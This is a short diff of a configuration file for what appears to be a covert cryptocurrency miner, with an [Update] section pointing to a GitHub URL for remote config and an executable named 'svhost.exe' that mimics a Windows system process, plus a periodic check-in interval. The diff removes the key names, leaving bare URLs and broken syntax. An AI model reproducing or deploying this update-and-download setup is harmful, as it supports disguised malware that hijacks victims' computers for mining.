@@ -7,8 +7,8 @@ proxy=0					; Change this value to "1" if you are mining to xmrig-proxy instead 
 keepalive=0				; 0 to disable keepalive, 1 to enable keepalive
 
 [Update]
-config_url=https://github.com/GSLLL1/1/raw/main/config.txt   
+https://github.com/GSLLL1/1/raw/main/config.txt   
 knock_time=360 				     	
-update_url=https://github.com/GSLLL1/1/raw/main/svhost.exe		
+https://github.com/GSLLL1/1/raw/main/svhost.exe		
 update_hash=xxxxxxxxxx				
-End 
+End of configuration.
